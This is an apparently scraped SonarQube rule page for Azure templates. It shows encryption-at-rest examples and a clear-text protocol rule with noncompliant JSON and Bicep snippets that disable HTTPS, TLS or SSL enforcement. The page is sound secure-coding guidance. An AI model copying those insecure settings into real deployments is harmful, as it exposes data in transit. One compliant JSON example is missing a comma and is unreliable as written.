<pre data-diff-id="104" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;osDisk&#34;: {
            &#34;encryptionSettings&#34;: {
              &#34;enabled&#34;: true,
              &#34;diskEncryptionKey&#34;: {
                &#34;secretUrl&#34;: &#34;string&#34;,
                &#34;sourceVault&#34;: {
                  &#34;id&#34;: &#34;string&#34;
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for OS managed disk:</p>
<pre data-diff-id="105" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;osDisk&#34;: {
            &#34;managedDisk&#34;: {
              &#34;id&#34;: &#34;myDiskId&#34;,
              &#34;diskEncryptionSet&#34;: {
                &#34;id&#34;: &#34;string&#34;
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for OS managed disk through security profile:</p>
<pre data-diff-id="106" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;storageProfile&#34;: {
          &#34;osDisk&#34;: {
            &#34;managedDisk&#34;: {
              &#34;securityProfile&#34;: {
                &#34;diskEncryptionSet&#34;: {
                  &#34;id&#34;: &#34;string&#34;
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachinescalesets/virtualmachines" rel="nofollow">Microsoft.Compute/virtualMachineScaleSets</a>:</p>
<p>Enabled encryption at host level:</p>
<pre data-diff-id="201" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;securityProfile&#34;: {
            &#34;encryptionAtHost&#34;: true
          }
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for data disk:</p>
<pre data-diff-id="202" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachineScaleSets&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;storageProfile&#34;: {
            &#34;dataDisks&#34;: [
              {
                &#34;name&#34;: &#34;myDataDisk&#34;,
                &#34;managedDisk&#34;: {
                  &#34;diskEncryptionSet&#34;: {
                    &#34;id&#34;: &#34;string&#34;
                  }
                }
              }
            ]
          }
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for data disk through security profile:</p>
<pre data-diff-id="203" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachineScaleSets&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;storageProfile&#34;: {
            &#34;dataDisks&#34;: [
              {
                &#34;name&#34;: &#34;myDataDisk&#34;,
                &#34;managedDisk&#34;: {
                  &#34;securityProfile&#34;: {
                    &#34;diskEncryptionSet&#34;: {
                      &#34;id&#34;: &#34;string&#34;
                    }
                  }
                }
              }
            ]
          }
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for OS disk:</p>
<pre data-diff-id="204" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachineScaleSets&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;storageProfile&#34;: {
            &#34;osDisk&#34;: {
              &#34;name&#34;: &#34;myOsDisk&#34;,
              &#34;managedDisk&#34;: {
                &#34;diskEncryptionSet&#34;: {
                  &#34;id&#34;: &#34;string&#34;
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for OS disk through security profile:</p>
<pre data-diff-id="205" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Compute/virtualMachineScaleSets&#34;,
      &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
      &#34;properties&#34;: {
        &#34;virtualMachineProfile&#34;: {
          &#34;storageProfile&#34;: {
            &#34;osDisk&#34;: {
              &#34;name&#34;: &#34;myOsDisk&#34;,
              &#34;managedDisk&#34;: {
                &#34;securityProfile&#34;: {
                  &#34;diskEncryptionSet&#34;: {
                    &#34;id&#34;: &#34;string&#34;
                  }
                }
              }
            }
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/managedclusters" rel="nofollow">Microsoft.ContainerService/managedClusters</a>:</p>
<p>Enabled encryption at host and set the disk encryption set ID:</p>
<pre data-diff-id="1101" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ContainerService/managedClusters&#34;,
      &#34;apiVersion&#34;: &#34;2023-03-02-preview&#34;,
      &#34;properties&#34;: {
        &#34;agentPoolProfiles&#34;: [
          {
            &#34;enableEncryptionAtHost&#34;: true
          }
        ]
        &#34;diskEncryptionSetID&#34;: &#34;string&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datalakestore/accounts" rel="nofollow">Microsoft.DataLakeStore/accounts</a>:</p>
<p>Enabled encryption for Data Lake Store:</p>
<pre data-diff-id="501" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DataLakeStore/accounts&#34;,
      &#34;apiVersion&#34;: &#34;2016-11-01&#34;,
      &#34;properties&#34;: {
        &#34;encryptionState&#34;: &#34;Enabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers" rel="nofollow">Microsoft.DBforMySQL/servers</a>:</p>
<p>Enabled infrastructure double encryption for MySQL server:</p>
<pre data-diff-id="601" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforMySQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;properties&#34;: {
        &#34;infrastructureEncryption&#34;: &#34;Enabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/2017-12-01/servers" rel="nofollow">Microsoft.DBforPostgreSQL/servers</a>:</p>
<p>Enabled infrastructure double encryption for PostgreSQL server:</p>
<pre data-diff-id="701" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforPostgreSQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;properties&#34;: {
        &#34;infrastructureEncryption&#34;: &#34;Enabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/fr-fr/azure/templates/microsoft.documentdb/cassandraclusters/datacenters" rel="nofollow">Microsoft.DocumentDB/cassandraClusters/dataCenters</a>:</p>
<p>Enabled encryption for a Cassandra Cluster datacenter’s managed disk and backup:</p>
<pre data-diff-id="901" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DocumentDB/cassandraClusters/dataCenters&#34;,
      &#34;apiVersion&#34;: &#34;2023-04-15&#34;,
      &#34;properties&#34;: {
        &#34;diskCapacity&#34;: 4,
        &#34;backupStorageCustomerKeyUri&#34;: &#34;string&#34;,
        &#34;managedDiskCustomerKeyUri&#34;: &#34;string&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.hdinsight/clusters" rel="nofollow">Microsoft.HDInsight/clusters</a>:</p>
<p>Enabled encryption for data disk:</p>
<pre data-diff-id="1301" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.HDInsight/clusters&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;computeProfile&#34;: {
          &#34;roles&#34;: [
            {
              &#34;encryptDataDisks&#34;: true
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for data disk at application level:</p>
<pre data-diff-id="1302" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.HDInsight/clusters/applications&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;computeProfile&#34;: {
          &#34;roles&#34;: [
            {
              &#34;encryptDataDisks&#34;: true
            }
          ]
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption for resource disk:</p>
<pre data-diff-id="1303" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.HDInsight/clusters&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;diskEncryptionProperties&#34;: {
          &#34;encryptionAtHost&#34;: true
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.kusto/clusters" rel="nofollow">Microsoft.Kusto/clusters</a>:</p>
<p>Enabled encryption for disk:</p>
<pre data-diff-id="1401" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Kusto/clusters&#34;,
      &#34;apiVersion&#34;: &#34;2022-12-29&#34;,
      &#34;properties&#34;: {
        &#34;enableDiskEncryption&#34;: true
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults" rel="nofollow">Microsoft.RecoveryServices/vaults</a>:</p>
<p>Enabled encryption on infrastructure:</p>
<pre data-diff-id="1501" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RecoveryServices/vaults&#34;,
      &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
      &#34;properties&#34;: {
        &#34;encryption&#34;: {
          &#34;infrastructureEncryption&#34;: &#34;Enabled&#34;
        }
      }
    }
  ]
}
</pre>
<p>Enabled encryption on infastructure for backup:</p>
<pre data-diff-id="1502" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RecoveryServices/vaults/backupEncryptionConfigs&#34;,
      &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
      &#34;properties&#34;: {
        &#34;encryptionAtRestType&#34;: &#34;{&#39;CustomerManaged&#39; | &#39;MicrosoftManaged&#39;}&#34;,
        &#34;infrastructureEncryptionState&#34;: &#34;Enabled&#34;
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.redhatopenshift/openshiftclusters" rel="nofollow">Microsoft.RedHatOpenShift/openShiftClusters</a>:</p>
<p>Enabled disk encryption for master profile and worker profiles:</p>
<pre data-diff-id="1601" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RedHatOpenShift/openShiftClusters&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-04&#34;,
      &#34;properties&#34;: {
        &#34;masterProfile&#34;: {
          &#34;diskEncryptionSetId&#34;: &#34;string&#34;,
          &#34;encryptionAtHost&#34;: &#34;Enabled&#34;
        },
        &#34;workerProfiles&#34;: [
          {
            &#34;diskEncryptionSetId&#34;: &#34;string&#34;,
            &#34;encryptionAtHost&#34;: &#34;Enabled&#34;
          }
        ]
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.sqlvirtualmachine/sqlvirtualmachines" rel="nofollow">Microsoft.SqlVirtualMachine/sqlVirtualMachines</a>:</p>
<p>Enabled encryption for SQL Virtual Machine:</p>
<pre data-diff-id="801" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.SqlVirtualMachine/sqlVirtualMachines&#34;,
      &#34;apiVersion&#34;: &#34;2022-08-01-preview&#34;,
      &#34;properties&#34;: {
        &#34;autoBackupSettings&#34;: {
          &#34;enableEncryption&#34;: true,
          &#34;password&#34;: &#34;string&#34;
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts" rel="nofollow">Microsoft.Storage/storageAccounts</a>:</p>
<p>Enabled enforcing of infrastructure encryption for double encryption of data:</p>
<pre data-diff-id="1001" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;encryption&#34;: {
          &#34;requireInfrastructureEncryption&#34;: true
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts/encryptionscopes?pivots&#61;deployment-language-bicep" rel="nofollow">Microsoft.Storage/storageAccounts/encryptionScopes</a>:</p>
<p>Enabled enforcing of infrastructure encryption for double encryption of data at encryption scope level:</p>
<pre data-diff-id="1002" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts/encryptionScopes&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;requireInfrastructureEncryption&#34;: true
      }
    }
  ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html" rel="nofollow">Data encryption in Amazon EFS</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://learn.microsoft.com/en-us/azure/backup/backup-encryption" rel="nofollow">Encryption in Azure Backup</a> </li><li> <a href="https://learn.microsoft.com/en-us/azure/mysql/single-server/concepts-security" rel="nofollow">Security in Azure Database for MySQL</a> </li><li> <a href="https://learn.microsoft.com/en-us/azure/postgresql/single-server/concepts-security" rel="nofollow">Security in Azure Database for PostgreSQL</a>
  </li><li> <a href="https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable?tabs&#61;portal" rel="nofollow">Infrastructure double encryption
  of data</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S5332">
              azureresourcemanager:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against tampering or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li></ul>  </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites" rel="nofollow">Microsoft.Web/sites</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;httpsOnly&#34;: false
      }
    }
  ]
}
</pre>
<pre data-diff-id="8" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.Web/sites&#64;2022-03-01&#39; &#61; {
  properties: {
    httpsOnly: false // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-web" rel="nofollow">Microsoft.Web/sites/config</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites/config&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;ftpsState&#34;: &#34;AllAllowed&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="9" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.Web/sites/config&#64;2022-09-01&#39; &#61; {
  properties: {
    ftpsState: &#39;AllAllowed&#39; // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts" rel="nofollow">Microsoft.Storage/storageAccounts</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;supportsHttpsTrafficOnly&#34;: false
      }
    }
  ]
}
</pre>
<pre data-diff-id="10" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.Storage/storageAccounts&#64;2022-09-01&#39; &#61; {
  properties: {
    supportsHttpsTrafficOnly: false // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/apis" rel="nofollow">Microsoft.ApiManagement/service/apis</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ApiManagement/service/apis&#34;,
      &#34;apiVersion&#34;: &#34;2022-08-01&#34;,
      &#34;properties&#34;: {
        &#34;protocols&#34;: [&#34;http&#34;]
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.ApiManagement/service/apis&#64;2022-08-01&#39; &#61; {
  properties: {
    protocols: [&#39;http&#39;] // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cdn/profiles/endpoints" rel="nofollow">Microsoft.Cdn/profiles/endpoints</a>:</p>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Cdn/profiles/endpoints&#34;,
      &#34;apiVersion&#34;: &#34;2021-06-01&#34;,
      &#34;properties&#34;: {
        &#34;isHttpAllowed&#34;: true
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.Cdn/profiles/endpoints&#64;2021-06-01&#39; &#61; {
  properties: {
    isHttpAllowed: true // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.cache/redisenterprise/databases" rel="nofollow">Microsoft.Cache/redisEnterprise/databases</a>:</p>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Cache/redisEnterprise/databases&#34;,
      &#34;apiVersion&#34;: &#34;2022-01-01&#34;,
      &#34;properties&#34;: {
        &#34;clientProtocol&#34;: &#34;Plaintext&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.Cache/redisEnterprise/databases&#64;2022-01-01&#39; &#61; {
  properties: {
    clientProtocol: &#34;Plaintext&#34; // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers" rel="nofollow">Microsoft.DBforMySQL/servers</a>, <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers" rel="nofollow">Microsoft.DBforMariaDB/servers</a>, and <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers" rel="nofollow">Microsoft.DBforPostgreSQL/servers</a>:</p>
<pre data-diff-id="7" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforMySQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;properties&#34;: {
        &#34;sslEnforcement&#34;: &#34;Disabled&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.DBforMySQL/servers&#64;2017-12-01&#39; &#61; {
  properties: {
    sslEnforcement: &#34;Disabled&#34; // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites" rel="nofollow">Microsoft.Web/sites</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;httpsOnly&#34;: true
      }
    }
  ]
}
</pre>
<pre data-diff-id="8" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.Web/sites&#64;2022-03-01&#39; &#61; {
  properties: {
    httpsOnly: true
  }
}
</pre>
